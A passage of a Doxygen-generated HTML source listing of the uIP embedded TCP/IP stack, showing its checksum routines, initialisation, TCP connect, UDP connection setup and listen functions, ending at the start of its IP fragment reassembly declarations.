<a name="l00249"></a><a class="code" href="a00151.html#g6832e4d2d046536b6472f7ac92340f68">00249</a> <a class="code" href="a00150.html#g6832e4d2d046536b6472f7ac92340f68">uip_add32</a>(<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *op32, <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> op16)
<a name="l00250"></a>00250 {
<a name="l00251"></a>00251   uip_acc32[3] = op32[3] + (op16 &amp; 0xff);
<a name="l00252"></a>00252   uip_acc32[2] = op32[2] + (op16 &gt;&gt; 8);
<a name="l00253"></a>00253   uip_acc32[1] = op32[1];
<a name="l00254"></a>00254   uip_acc32[0] = op32[0];
<a name="l00255"></a>00255   
<a name="l00256"></a>00256   <span class="keywordflow">if</span>(uip_acc32[2] &lt; (op16 &gt;&gt; 8)) {
<a name="l00257"></a>00257     ++uip_acc32[1];
<a name="l00258"></a>00258     <span class="keywordflow">if</span>(uip_acc32[1] == 0) {
<a name="l00259"></a>00259       ++uip_acc32[0];
<a name="l00260"></a>00260     }
<a name="l00261"></a>00261   }
<a name="l00262"></a>00262   
<a name="l00263"></a>00263   
<a name="l00264"></a>00264   <span class="keywordflow">if</span>(uip_acc32[3] &lt; (op16 &amp; 0xff)) {
<a name="l00265"></a>00265     ++uip_acc32[2];
<a name="l00266"></a>00266     <span class="keywordflow">if</span>(uip_acc32[2] == 0) {
<a name="l00267"></a>00267       ++uip_acc32[1];
<a name="l00268"></a>00268       <span class="keywordflow">if</span>(uip_acc32[1] == 0) {
<a name="l00269"></a>00269         ++uip_acc32[0];
<a name="l00270"></a>00270       }
<a name="l00271"></a>00271     }
<a name="l00272"></a>00272   }
<a name="l00273"></a>00273 }
<a name="l00274"></a>00274 
<a name="l00275"></a>00275 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ARCH_ADD32 */</span>
<a name="l00276"></a>00276 
<a name="l00277"></a>00277 <span class="preprocessor">#if ! UIP_ARCH_CHKSUM</span>
<a name="l00278"></a>00278 <span class="preprocessor"></span><span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00279"></a>00279 <span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00280"></a>00280 chksum(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> sum, <span class="keyword">const</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *data, <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> len)
<a name="l00281"></a>00281 {
<a name="l00282"></a>00282   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> t;
<a name="l00283"></a>00283   <span class="keyword">const</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *dataptr;
<a name="l00284"></a>00284   <span class="keyword">const</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *last_byte;
<a name="l00285"></a>00285 
<a name="l00286"></a>00286   dataptr = data;
<a name="l00287"></a>00287   last_byte = data + len - 1;
<a name="l00288"></a>00288   
<a name="l00289"></a>00289   <span class="keywordflow">while</span>(dataptr &lt; last_byte) {  <span class="comment">/* At least two more bytes */</span>
<a name="l00290"></a>00290     t = (dataptr[0] &lt;&lt; 8) + dataptr[1];
<a name="l00291"></a>00291     sum += t;
<a name="l00292"></a>00292     <span class="keywordflow">if</span>(sum &lt; t) {
<a name="l00293"></a>00293       sum++;            <span class="comment">/* carry */</span>
<a name="l00294"></a>00294     }
<a name="l00295"></a>00295     dataptr += 2;
<a name="l00296"></a>00296   }
<a name="l00297"></a>00297   
<a name="l00298"></a>00298   <span class="keywordflow">if</span>(dataptr == last_byte) {
<a name="l00299"></a>00299     t = (dataptr[0] &lt;&lt; 8) + 0;
<a name="l00300"></a>00300     sum += t;
<a name="l00301"></a>00301     <span class="keywordflow">if</span>(sum &lt; t) {
<a name="l00302"></a>00302       sum++;            <span class="comment">/* carry */</span>
<a name="l00303"></a>00303     }
<a name="l00304"></a>00304   }
<a name="l00305"></a>00305 
<a name="l00306"></a>00306   <span class="comment">/* Return sum in host byte order. */</span>
<a name="l00307"></a>00307   <span class="keywordflow">return</span> sum;
<a name="l00308"></a>00308 }
<a name="l00309"></a>00309 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00310"></a>00310 <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00311"></a><a class="code" href="a00150.html#gb6683dd83fe1c8de9a24086d4b69e907">00311</a> <a class="code" href="a00150.html#gb6683dd83fe1c8de9a24086d4b69e907">uip_chksum</a>(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> *data, <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> len)
<a name="l00312"></a>00312 {
<a name="l00313"></a>00313   <span class="keywordflow">return</span> <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(chksum(0, (<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *)data, len));
<a name="l00314"></a>00314 }
<a name="l00315"></a>00315 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00316"></a>00316 <span class="preprocessor">#ifndef UIP_ARCH_IPCHKSUM</span>
<a name="l00317"></a>00317 <span class="preprocessor"></span><a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00318"></a><a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">00318</a> <a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>(<span class="keywordtype">void</span>)
<a name="l00319"></a>00319 {
<a name="l00320"></a>00320   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> sum;
<a name="l00321"></a>00321 
<a name="l00322"></a>00322   sum = chksum(0, &amp;uip_buf[<a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a>], <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>);
<a name="l00323"></a>00323   <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"uip_ipchksum: sum 0x%04x\n"</span>, sum);
<a name="l00324"></a>00324   <span class="keywordflow">return</span> (sum == 0) ? 0xffff : <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(sum);
<a name="l00325"></a>00325 }
<a name="l00326"></a>00326 <span class="preprocessor">#endif</span>
<a name="l00327"></a>00327 <span class="preprocessor"></span><span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00328"></a>00328 <span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00329"></a>00329 upper_layer_chksum(<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> proto)
<a name="l00330"></a>00330 {
<a name="l00331"></a>00331   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> upper_layer_len;
<a name="l00332"></a>00332   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> sum;
<a name="l00333"></a>00333   
<a name="l00334"></a>00334 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00335"></a>00335 <span class="preprocessor"></span>  upper_layer_len = (((<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0]) &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1]);
<a name="l00336"></a>00336 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00337"></a>00337   upper_layer_len = (((<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0]) &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1]) - <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>;
<a name="l00338"></a>00338 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00339"></a>00339   
<a name="l00340"></a>00340   <span class="comment">/* First sum pseudoheader. */</span>
<a name="l00341"></a>00341   
<a name="l00342"></a>00342   <span class="comment">/* IP protocol and length fields. This addition cannot carry. */</span>
<a name="l00343"></a>00343   sum = upper_layer_len + proto;
<a name="l00344"></a>00344   <span class="comment">/* Sum IP source and destination addresses. */</span>
<a name="l00345"></a>00345   sum = chksum(sum, (<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> *)&amp;<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr[0], 2 * <span class="keyword">sizeof</span>(<a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a>));
<a name="l00346"></a>00346 
<a name="l00347"></a>00347   <span class="comment">/* Sum TCP header and data. */</span>
<a name="l00348"></a>00348   sum = chksum(sum, &amp;uip_buf[<a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a>],
<a name="l00349"></a>00349                upper_layer_len);
<a name="l00350"></a>00350     
<a name="l00351"></a>00351   <span class="keywordflow">return</span> (sum == 0) ? 0xffff : <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(sum);
<a name="l00352"></a>00352 }
<a name="l00353"></a>00353 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00354"></a>00354 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00355"></a>00355 <span class="preprocessor"></span><a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00356"></a>00356 uip_icmp6chksum(<span class="keywordtype">void</span>)
<a name="l00357"></a>00357 {
<a name="l00358"></a>00358   <span class="keywordflow">return</span> upper_layer_chksum(<a class="code" href="a00150.html#gad0321f4c570f9983c6de81ece3ddc20">UIP_PROTO_ICMP6</a>);
<a name="l00359"></a>00359   
<a name="l00360"></a>00360 }
<a name="l00361"></a>00361 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00362"></a>00362 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00363"></a>00363 <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00364"></a><a class="code" href="a00150.html#g85b65e38aa74eba18979156f97a94a87">00364</a> <a class="code" href="a00150.html#g85b65e38aa74eba18979156f97a94a87">uip_tcpchksum</a>(<span class="keywordtype">void</span>)
<a name="l00365"></a>00365 {
<a name="l00366"></a>00366   <span class="keywordflow">return</span> upper_layer_chksum(<a class="code" href="a00150.html#g517c770991459cc62dc009c0d3875c6a">UIP_PROTO_TCP</a>);
<a name="l00367"></a>00367 }
<a name="l00368"></a>00368 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00369"></a>00369 <span class="preprocessor">#if UIP_UDP_CHECKSUMS</span>
<a name="l00370"></a>00370 <span class="preprocessor"></span><a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>
<a name="l00371"></a>00371 <a class="code" href="a00150.html#g7023a34ba9e9d03b5fbedbcb32924453">uip_udpchksum</a>(<span class="keywordtype">void</span>)
<a name="l00372"></a>00372 {
<a name="l00373"></a>00373   <span class="keywordflow">return</span> upper_layer_chksum(<a class="code" href="a00150.html#gf72d7b9a737707dcfb2c41fec2b6792e">UIP_PROTO_UDP</a>);
<a name="l00374"></a>00374 }
<a name="l00375"></a>00375 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP_CHECKSUMS */</span>
<a name="l00376"></a>00376 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ARCH_CHKSUM */</span>
<a name="l00377"></a>00377 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00378"></a>00378 <span class="keywordtype">void</span>
<a name="l00379"></a><a class="code" href="a00150.html#gc48ed5f0d27721ef62a3ed02a5ad8d2e">00379</a> <a class="code" href="a00145.html#gc48ed5f0d27721ef62a3ed02a5ad8d2e">uip_init</a>(<span class="keywordtype">void</span>)
<a name="l00380"></a>00380 {
<a name="l00381"></a>00381   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g8f4ebd8ef6c0ea665ed351d87fec09fd">UIP_LISTENPORTS</a>; ++c) {
<a name="l00382"></a>00382     uip_listenports[c] = 0;
<a name="l00383"></a>00383   }
<a name="l00384"></a>00384   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a>; ++c) {
<a name="l00385"></a>00385     <a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c].tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l00386"></a>00386   }
<a name="l00387"></a>00387 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l00388"></a>00388 <span class="preprocessor"></span>  lastport = 1024;
<a name="l00389"></a>00389 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l00390"></a>00390 
<a name="l00391"></a>00391 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00392"></a>00392 <span class="preprocessor"></span>  <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g196379ceb1219a99f4495e41ccc9bbfb">UIP_UDP_CONNS</a>; ++c) {
<a name="l00393"></a>00393     <a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[c].lport = 0;
<a name="l00394"></a>00394   }
<a name="l00395"></a>00395 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l00396"></a>00396   
<a name="l00397"></a>00397 
<a name="l00398"></a>00398   <span class="comment">/* IPv4 initialization. */</span>
<a name="l00399"></a>00399 <span class="preprocessor">#if UIP_FIXEDADDR == 0</span>
<a name="l00400"></a>00400 <span class="preprocessor"></span>  <span class="comment">/*  uip_hostaddr[0] = uip_hostaddr[1] = 0;*/</span>
<a name="l00401"></a>00401 <span class="preprocessor">#endif </span><span class="comment">/* UIP_FIXEDADDR */</span>
<a name="l00402"></a>00402 
<a name="l00403"></a>00403 }
<a name="l00404"></a>00404 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00405"></a>00405 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l00406"></a>00406 <span class="preprocessor"></span><span class="keyword">struct </span><a class="code" href="a00150.html#g788ffac72342f6172343d7f8099cbe1a">uip_conn</a> *
<a name="l00407"></a><a class="code" href="a00150.html#g9c24fba2cd8f7f62accb0a0d5bbe4dad">00407</a> <a class="code" href="a00147.html#g8096b0c4b543dc408f4dd031ddae7240">uip_connect</a>(<a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> *<a class="code" href="a00088.html#79510aa86d3fa0a0fc6cfc49b1da7279">ripaddr</a>, <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> <a class="code" href="a00088.html#1df6aa054ef2fa634ac4c6f418228285">rport</a>)
<a name="l00408"></a>00408 {
<a name="l00409"></a>00409   <span class="keyword">register</span> <span class="keyword">struct </span><a class="code" href="a00150.html#g788ffac72342f6172343d7f8099cbe1a">uip_conn</a> *conn, *cconn;
<a name="l00410"></a>00410   
<a name="l00411"></a>00411   <span class="comment">/* Find an unused local port. */</span>
<a name="l00412"></a>00412  again:
<a name="l00413"></a>00413   ++lastport;
<a name="l00414"></a>00414 
<a name="l00415"></a>00415   <span class="keywordflow">if</span>(lastport &gt;= 32000) {
<a name="l00416"></a>00416     lastport = 4096;
<a name="l00417"></a>00417   }
<a name="l00418"></a>00418 
<a name="l00419"></a>00419   <span class="comment">/* Check if this port is already in use, and if so try to find</span>
<a name="l00420"></a>00420 <span class="comment">     another one. */</span>
<a name="l00421"></a>00421   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a>; ++c) {
<a name="l00422"></a>00422     conn = &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c];
<a name="l00423"></a>00423     <span class="keywordflow">if</span>(conn-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> != <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a> &amp;&amp;
<a name="l00424"></a>00424        conn-&gt;<a class="code" href="a00088.html#0cd09beee671e7e9efb0b4aced10249e">lport</a> == <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(lastport)) {
<a name="l00425"></a>00425       <span class="keywordflow">goto</span> again;
<a name="l00426"></a>00426     }
<a name="l00427"></a>00427   }
<a name="l00428"></a>00428 
<a name="l00429"></a>00429   conn = 0;
<a name="l00430"></a>00430   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a>; ++c) {
<a name="l00431"></a>00431     cconn = &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c];
<a name="l00432"></a>00432     <span class="keywordflow">if</span>(cconn-&gt;tcpstateflags == <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>) {
<a name="l00433"></a>00433       conn = cconn;
<a name="l00434"></a>00434       <span class="keywordflow">break</span>;
<a name="l00435"></a>00435     }
<a name="l00436"></a>00436     <span class="keywordflow">if</span>(cconn-&gt;tcpstateflags == <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>) {
<a name="l00437"></a>00437       <span class="keywordflow">if</span>(conn == 0 ||
<a name="l00438"></a>00438          cconn-&gt;timer &gt; conn-&gt;timer) {
<a name="l00439"></a>00439         conn = cconn;
<a name="l00440"></a>00440       }
<a name="l00441"></a>00441     }
<a name="l00442"></a>00442   }
<a name="l00443"></a>00443 
<a name="l00444"></a>00444   <span class="keywordflow">if</span>(conn == 0) {
<a name="l00445"></a>00445     <span class="keywordflow">return</span> 0;
<a name="l00446"></a>00446   }
<a name="l00447"></a>00447   
<a name="l00448"></a>00448   conn-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> = <a class="code" href="a00150.html#g8af482dec973db57d8b3bd3f69461488">UIP_SYN_SENT</a>;
<a name="l00449"></a>00449 
<a name="l00450"></a>00450   conn-&gt;snd_nxt[0] = iss[0];
<a name="l00451"></a>00451   conn-&gt;snd_nxt[1] = iss[1];
<a name="l00452"></a>00452   conn-&gt;snd_nxt[2] = iss[2];
<a name="l00453"></a>00453   conn-&gt;snd_nxt[3] = iss[3];
<a name="l00454"></a>00454 
<a name="l00455"></a>00455   conn-&gt;initialmss = conn-&gt;mss = <a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>;
<a name="l00456"></a>00456   
<a name="l00457"></a>00457   conn-&gt;len = 1;   <span class="comment">/* TCP length of the SYN is one. */</span>
<a name="l00458"></a>00458   conn-&gt;nrtx = 0;
<a name="l00459"></a>00459   conn-&gt;timer = 1; <span class="comment">/* Send the SYN next time around. */</span>
<a name="l00460"></a>00460   conn-&gt;rto = <a class="code" href="a00153.html#g15de27b044603284f68db05a378235a7">UIP_RTO</a>;
<a name="l00461"></a>00461   conn-&gt;sa = 0;
<a name="l00462"></a>00462   conn-&gt;sv = 16;   <span class="comment">/* Initial value of the RTT variance. */</span>
<a name="l00463"></a>00463   conn-&gt;lport = <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(lastport);
<a name="l00464"></a>00464   conn-&gt;rport = <a class="code" href="a00088.html#1df6aa054ef2fa634ac4c6f418228285">rport</a>;
<a name="l00465"></a>00465   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(&amp;conn-&gt;ripaddr, <a class="code" href="a00088.html#79510aa86d3fa0a0fc6cfc49b1da7279">ripaddr</a>);
<a name="l00466"></a>00466   
<a name="l00467"></a>00467   <span class="keywordflow">return</span> conn;
<a name="l00468"></a>00468 }
<a name="l00469"></a>00469 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l00470"></a>00470 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00471"></a>00471 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00472"></a>00472 <span class="preprocessor"></span><span class="keyword">struct </span><a class="code" href="a00150.html#g210f227119fc972e6222c9cb452e15a9">uip_udp_conn</a> *
<a name="l00473"></a><a class="code" href="a00150.html#g79c4110211247df3fb30b8cf1c4c02af">00473</a> <a class="code" href="a00147.html#g79c4110211247df3fb30b8cf1c4c02af">uip_udp_new</a>(<a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> *<a class="code" href="a00095.html#8a661a2d544100b82d0d14a1985083d5">ripaddr</a>, <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> <a class="code" href="a00095.html#280a0c2a93544e597f92bbacf36ee1dc">rport</a>)
<a name="l00474"></a>00474 {
<a name="l00475"></a>00475   <span class="keyword">register</span> <span class="keyword">struct </span><a class="code" href="a00150.html#g210f227119fc972e6222c9cb452e15a9">uip_udp_conn</a> *conn;
<a name="l00476"></a>00476   
<a name="l00477"></a>00477   <span class="comment">/* Find an unused local port. */</span>
<a name="l00478"></a>00478  again:
<a name="l00479"></a>00479   ++lastport;
<a name="l00480"></a>00480 
<a name="l00481"></a>00481   <span class="keywordflow">if</span>(lastport &gt;= 32000) {
<a name="l00482"></a>00482     lastport = 4096;
<a name="l00483"></a>00483   }
<a name="l00484"></a>00484   
<a name="l00485"></a>00485   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g196379ceb1219a99f4495e41ccc9bbfb">UIP_UDP_CONNS</a>; ++c) {
<a name="l00486"></a>00486     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[c].<a class="code" href="a00095.html#981392e295db4d024eea95805c51c371">lport</a> == <a class="code" href="a00148.html#ga22b04cac8cf283ca12f028578bebc06">htons</a>(lastport)) {
<a name="l00487"></a>00487       <span class="keywordflow">goto</span> again;
<a name="l00488"></a>00488     }
<a name="l00489"></a>00489   }
<a name="l00490"></a>00490 
<a name="l00491"></a>00491 
<a name="l00492"></a>00492   conn = 0;
<a name="l00493"></a>00493   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g196379ceb1219a99f4495e41ccc9bbfb">UIP_UDP_CONNS</a>; ++c) {
<a name="l00494"></a>00494     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[c].<a class="code" href="a00095.html#981392e295db4d024eea95805c51c371">lport</a> == 0) {
<a name="l00495"></a>00495       conn = &amp;<a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[c];
<a name="l00496"></a>00496       <span class="keywordflow">break</span>;
<a name="l00497"></a>00497     }
<a name="l00498"></a>00498   }
<a name="l00499"></a>00499 
<a name="l00500"></a>00500   <span class="keywordflow">if</span>(conn == 0) {
<a name="l00501"></a>00501     <span class="keywordflow">return</span> 0;
<a name="l00502"></a>00502   }
<a name="l00503"></a>00503   
<a name="l00504"></a>00504   conn-&gt;<a class="code" href="a00095.html#981392e295db4d024eea95805c51c371">lport</a> = <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(lastport);
<a name="l00505"></a>00505   conn-&gt;rport = <a class="code" href="a00095.html#280a0c2a93544e597f92bbacf36ee1dc">rport</a>;
<a name="l00506"></a>00506   <span class="keywordflow">if</span>(<a class="code" href="a00095.html#8a661a2d544100b82d0d14a1985083d5">ripaddr</a> == <a class="code" href="a00160.html#g070d2ce7b6bb7e5c05602aa8c308d0c4">NULL</a>) {
<a name="l00507"></a>00507     memset(conn-&gt;ripaddr, 0, <span class="keyword">sizeof</span>(<a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a>));
<a name="l00508"></a>00508   } <span class="keywordflow">else</span> {
<a name="l00509"></a>00509     <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(&amp;conn-&gt;ripaddr, <a class="code" href="a00095.html#8a661a2d544100b82d0d14a1985083d5">ripaddr</a>);
<a name="l00510"></a>00510   }
<a name="l00511"></a>00511   conn-&gt;ttl = <a class="code" href="a00153.html#gb61381673de27f31848c5396bf0b338e">UIP_TTL</a>;
<a name="l00512"></a>00512   
<a name="l00513"></a>00513   <span class="keywordflow">return</span> conn;
<a name="l00514"></a>00514 }
<a name="l00515"></a>00515 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l00516"></a>00516 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00517"></a>00517 <span class="keywordtype">void</span>
<a name="l00518"></a><a class="code" href="a00150.html#gaa585784b0914cac1d37f07f85457008">00518</a> <a class="code" href="a00147.html#gaa585784b0914cac1d37f07f85457008">uip_unlisten</a>(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> port)
<a name="l00519"></a>00519 {
<a name="l00520"></a>00520   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g8f4ebd8ef6c0ea665ed351d87fec09fd">UIP_LISTENPORTS</a>; ++c) {
<a name="l00521"></a>00521     <span class="keywordflow">if</span>(uip_listenports[c] == port) {
<a name="l00522"></a>00522       uip_listenports[c] = 0;
<a name="l00523"></a>00523       <span class="keywordflow">return</span>;
<a name="l00524"></a>00524     }
<a name="l00525"></a>00525   }
<a name="l00526"></a>00526 }
<a name="l00527"></a>00527 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00528"></a>00528 <span class="keywordtype">void</span>
<a name="l00529"></a><a class="code" href="a00150.html#gdd1ab3704ecd4900eec61a6897d32dc8">00529</a> <a class="code" href="a00147.html#gdd1ab3704ecd4900eec61a6897d32dc8">uip_listen</a>(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> port)
<a name="l00530"></a>00530 {
<a name="l00531"></a>00531   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g8f4ebd8ef6c0ea665ed351d87fec09fd">UIP_LISTENPORTS</a>; ++c) {
<a name="l00532"></a>00532     <span class="keywordflow">if</span>(uip_listenports[c] == 0) {
<a name="l00533"></a>00533       uip_listenports[c] = port;
<a name="l00534"></a>00534       <span class="keywordflow">return</span>;
<a name="l00535"></a>00535     }
<a name="l00536"></a>00536   }
<a name="l00537"></a>00537 }
<a name="l00538"></a>00538 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00539"></a>00539 <span class="comment">/* XXX: IP fragment reassembly: not well-tested. */</span>
<a name="l00540"></a>00540 
<a name="l00541"></a>00541 <span class="preprocessor">#if UIP_REASSEMBLY &amp;&amp; !UIP_CONF_IPV6</span>
<a name="l00542"></a>00542 <span class="preprocessor"></span><span class="preprocessor">#define UIP_REASS_BUFSIZE (UIP_BUFSIZE - UIP_LLH_LEN)</span>
<a name="l00543"></a>00543 <span class="preprocessor"></span><span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> uip_reassbuf[UIP_REASS_BUFSIZE];
<a name="l00544"></a>00544 <span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> uip_reassbitmap[UIP_REASS_BUFSIZE / (8 * 8)];
<a name="l00545"></a>00545 <span class="keyword">static</span> <span class="keyword">const</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> bitmap_bits[8] = {0xff, 0x7f, 0x3f, 0x1f,
<a name="l00546"></a>00546                                     0x0f, 0x07, 0x03, 0x01};
<a name="l00547"></a>00547 <span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> uip_reasslen;
<a name="l00548"></a>00548 <span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> uip_reassflags;
<a name="l00549"></a>00549 <span class="preprocessor">#define UIP_REASS_FLAG_LASTFRAG 0x01</span>
<a name="l00550"></a>00550 <span class="preprocessor"></span><span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> uip_reasstmr;
